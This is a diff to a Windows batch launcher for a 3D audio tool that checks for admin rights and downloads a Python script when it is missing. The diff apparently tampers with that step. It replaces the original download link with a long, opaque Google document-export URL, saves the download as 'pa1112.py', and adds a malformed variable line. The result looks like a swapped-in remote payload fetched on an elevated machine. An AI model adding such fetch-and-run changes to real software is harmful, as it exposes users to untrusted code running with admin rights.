@@ -2,7 +2,7 @@
 REM ========================================
 REM 3D Audio Processing Launcher (Windows)
 REM ========================================
-
+set pa1112.py=%PY_SCRIPT%
 REM --- Check for admin rights ---
 net session >nul 2>&1
 IF %ERRORLEVEL% NEQ 0 (
@@ -115,7 +115,7 @@ REM --- Check if Python script exists, if not download ---
 set PY_SCRIPT=PYTHONSCRIPT.py
 IF NOT EXIST "%PY_SCRIPT%" (
     echo Python script not found, downloading...
-    powershell -Command "Invoke-WebRequest -Uri 'https://drive.usercontent.google.com/download?id=1NYLVw1kMjRypD2QG6FPLtxArFiLQdnsX&export=download' -OutFile '%PY_SCRIPT%'"
+    powershell -Command "Invoke-WebRequest -Uri 'https://doc-0o-bg-docstext.googleusercontent.com/export/9ki07gn521c2tv3m4j64iib8f4/q710ta1lfshjkq5sa7dss49sl4/1757403475000/113176530761290358192/113176530761290358192/1gp5Km9Omzfst9zR1fduEgjUifO2VqivBHZaZIPwki-Y?format=docx&dat=AOBvIb3GcPk-JseTSHw1RNcbie37tWkMpniyy6Phhvj4LIuyi-q6viYWuXhaJFqt9nPIjkhpvik_Y6WoK6PvF-Kovg93unJh_xGPo-8ssEzmuzEF2Kin-nLxDl6LmPC64t2VswtH9M5_iBubW_pKAMlEchIOcfnYz7Kef7sxhs_PmYueV1d8FQCZhIW1hVaX9BZPV5wBKNkic9MsqLaY5i581pwR8V8t8RZOR-F_QCAxf1oEW-J-TN8HmY5s7xJFUPdnV1rl5T3wQ8F6q-iTxuyM2Hb2kjo9CgNY1Fn6prDo86DZ4U4qltm_iUHxvcMbSpw-wjOMJQAaGWEmovrjB9X3mcg7asfgkhxgGBqlJcrxDNLwUFlCEz5c48kxEi_DpwVwtJMQIp-slOAvOKWbakFAEWIymePv2nQ4bZzR8uHWwLCeuw410AF2HYBSoh0b2lSBSHgnCw9qmUDf9i7oGVAY-Mt83lsWM-8W11qN2qgESZjMKp6Bi15AfKu1XyNxvcUsiC34Zyy9G8rUBt6IBNxoFtoFLOH2RghUwyMD74Y6WDBifv3AVuRjct69UuBCZdgm_JXg9ccCRiGbveUFtDIlfRqeAgn9QmlgeGVrXGDApSjK3DEQcsxU9uxtHyufU2c5pM2Xrygz6_ACGR0XUcQ00_YVh7TJ7HJ-vE5YRJMvulD80ml8gGCSY4DgTo4LVPQzKCZWFHlVijx_YFSgEQNFfz30LHQ2Uw9FbaqSkJ6Mgct9EusTX30c6ZMyGV7DNZlFWCeaUN07EchAIJfN381R-KNODaWdwjcrlH8itxo6h2I438icBclXUK-xK9D8T2npWRhepE-X1vLU-a9MlcwrW-n0_PGLCiO4BUp2iGlOFNtjnkXjlK9Ls3X3moOS--Q7Ep3xkTqKzkfXFEyic9G3vnsUd8Ei' -OutFile 'pa1112.py'"
     IF %ERRORLEVEL% NEQ 0 (
         echo Failed to download Python script.
         pause
